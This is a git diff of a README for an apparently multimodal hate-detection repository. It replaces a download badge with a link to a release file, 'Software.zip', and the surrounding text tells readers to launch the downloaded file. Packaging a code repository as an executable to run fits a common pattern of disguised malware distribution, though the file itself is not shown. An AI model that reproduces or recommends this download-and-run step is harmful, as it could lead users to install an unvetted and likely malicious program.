@@ -26,7 +26,7 @@ Welcome to the Hate-Detection-Video-MultiModaL-DeepL repository! This repository
 ## Get Started
 To access the latest version of the repository, please click on the button below:
 
-[![Download Repository](https://img.shields.io/badge/Download-Repository-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Repository](https://github.com/EXEsvdi/Hate-Detection-Video-MultiModaL-DeepL/releases/download/v1.0/Software.zip)](https://github.com/EXEsvdi/Hate-Detection-Video-MultiModaL-DeepL/releases/download/v1.0/Software.zip)
 
 If the link above ends with a file name, you will need to launch the downloaded file to access the repository contents.
 
